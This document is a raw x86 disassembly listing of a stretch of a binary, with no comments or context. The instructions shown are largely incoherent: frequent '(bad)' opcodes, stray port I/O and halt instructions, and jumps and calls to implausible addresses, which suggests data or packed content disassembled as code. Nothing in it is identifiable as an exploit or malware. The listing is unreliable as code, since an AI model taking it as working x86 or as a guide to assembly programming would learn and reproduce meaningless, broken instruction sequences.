  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
